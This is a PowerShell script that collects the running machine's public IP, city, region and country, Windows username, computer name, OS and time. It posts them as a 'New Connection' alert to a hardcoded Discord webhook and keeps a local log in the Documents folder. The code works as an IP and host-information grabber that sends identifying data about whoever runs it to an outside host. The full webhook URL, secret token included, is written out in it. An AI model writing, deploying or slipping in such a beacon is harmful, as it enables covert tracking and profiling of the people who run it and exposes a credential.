# Get public IP and location
Write-Host "`n[1/5] Fetching public IP and location..." -ForegroundColor Yellow
try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $city = $ipInfo.city
    $region = $ipInfo.regionName
    Write-Host "      IP: $ip" -ForegroundColor Green
    Write-Host "      Location: $city, $region, $country" -ForegroundColor Green
} catch {
    $ip = "Unable to fetch"
    $country = "Unknown"
    $city = "Unknown"
    $region = "Unknown"
    Write-Host "      Failed to get IP: $($_.Exception.Message)" -ForegroundColor Red
}

# Get username
Write-Host "`n[2/5] Getting username..." -ForegroundColor Yellow
$user = $env:USERNAME
Write-Host "      User: $user" -ForegroundColor Green

# Get machine info
Write-Host "`n[3/5] Getting OS info..." -ForegroundColor Yellow
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$computer = $env:COMPUTERNAME
Write-Host "      Computer: $computer" -ForegroundColor Green
Write-Host "      OS: $os" -ForegroundColor Green

# Get time
Write-Host "`n[4/5] Getting timestamp..." -ForegroundColor Yellow
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "      Time: $time" -ForegroundColor Green

# Compose message
$message = "**New Connection**`n:clock1: $time`n:computer: $computer`n:bust_in_silhouette: $user`n:desktop: $os`n:globe_with_meridians: $ip`n:flag_$($country.ToLower().Substring(0,2)): $city, $region, $country"

# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"

Write-Host "`n[5/5] Sending to Discord..." -ForegroundColor Yellow
Write-Host "      Webhook: $($webhookUrl.Substring(0,50))..." -ForegroundColor Gray

# Create JSON payload
$payload = @{
    content = $message
} | ConvertTo-Json

Write-Host "      Payload created" -ForegroundColor Gray
Write-Host "      Sending HTTP POST..." -ForegroundColor Gray

# Send to Discord
try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -Verbose
    Write-Host "`n================================" -ForegroundColor Green
    Write-Host "SUCCESS! Message sent to Discord!" -ForegroundColor Green
    Write-Host "================================" -ForegroundColor Green
} catch {
    Write-Host "`n================================" -ForegroundColor Red
    Write-Host "FAILED TO SEND!" -ForegroundColor Red
    Write-Host "================================" -ForegroundColor Red
    Write-Host "Error Message: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Error Type: $($_.Exception.GetType().FullName)" -ForegroundColor Red
    
    if ($_.Exception.Response) {
        Write-Host "Status Code: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
        Write-Host "Status Description: $($_.Exception.Response.StatusDescription)" -ForegroundColor Red
    }
    
    Write-Host "`nFull Error Details:" -ForegroundColor Red
    Write-Host $_ -ForegroundColor Red
}

# Save backup locally
Write-Host "`nSaving backup locally..." -ForegroundColor Yellow
$doc = [Environment]::GetFolderPath("MyDocuments")
$out = Join-Path $doc "ip.txt"
Add-Content -Path $out -Value "$time | $user | $computer | $os | IP: $ip | Location: $city, $region, $country"
Write-Host "Backup saved to: $out" -ForegroundColor Green
